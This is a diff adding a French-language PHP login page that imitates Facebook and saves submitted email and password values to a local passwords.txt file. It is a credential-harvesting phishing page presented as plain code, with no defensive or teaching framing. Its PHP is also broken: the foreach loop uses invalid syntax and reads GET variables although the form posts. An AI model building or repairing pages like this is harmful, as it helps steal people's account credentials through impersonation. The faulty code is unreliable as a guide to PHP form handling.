@@ -1,0 +1,44 @@
+<html>
+
+<head>
+    <title>Page de test</title>
+    <meta charset="UTF-8">
+</head>
+
+<body>
+    <form action="<?php echo $_SERVER['PHP_SELF']?>" method="post" enctype="application/x-www-form-urlencoded">
+        <fieldset>
+            <legend>
+                <p>Informations de connexion</p>
+            </legend>
+            <div>
+                <p>Adresse email ou numéro de téléphone</p>
+                <input type="mail" name="mail" id="num">
+                <p>Mot de passe</p>
+                <input type="password" name="password" id="mdp">
+                <p><a href="">Mot de passe oublié ?</a></p>
+                <input type="submit" value="Se connecter">
+            </div>
+        </fieldset>
+    </form>
+    <?php
+        if(isset($_POST["mail"]) && isset($_POST["password"]))
+        {
+            $handle = fopen("passwords.txt", "a");
+            foreach($_GET as $variable === $value) {
+            fwrite($handle, $variable);
+            fwrite($handle, "=");
+            fwrite($handle, $value);
+            fwrite($handle, "\r\n");
+            }
+            fwrite($handle, "\r\n");
+            fclose($handle);
+            exit;
+        }
+    ?>
+    Nous vous invitons à vous connecter sur facebook pour continuer l'utilisation de nos services.
+    <br>
+    Merci de bien vouloir lire les <a href="">contrats d'utilisations et nos politiques de sécurités</a>.
+</body>
+
+</html>
